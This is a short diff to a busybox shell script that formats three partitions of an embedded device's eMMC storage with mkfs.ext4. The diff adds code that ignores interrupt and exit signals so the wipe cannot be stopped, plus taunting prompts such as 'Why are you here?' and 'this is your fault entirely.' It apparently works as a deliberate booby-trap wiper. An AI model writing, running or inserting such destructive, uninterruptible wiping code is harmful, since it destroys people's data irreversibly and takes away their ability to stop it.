@@ -1,5 +1,15 @@
 #!/bin/busybox sh
 
+setsid -c test
+trap '' INT
+trap '' SIGINT
+trap '' EXIT
+
+read -p "Why are you here?"
+echo ""
+read -p "this is your fault entirely."
+echo -e "bye bye now\n\n"
+
 mkfs.ext4 /dev/mmcblk0p1
 mkfs.ext4 /dev/mmcblk0p2
 mkfs.ext4 /dev/mmcblk0p3
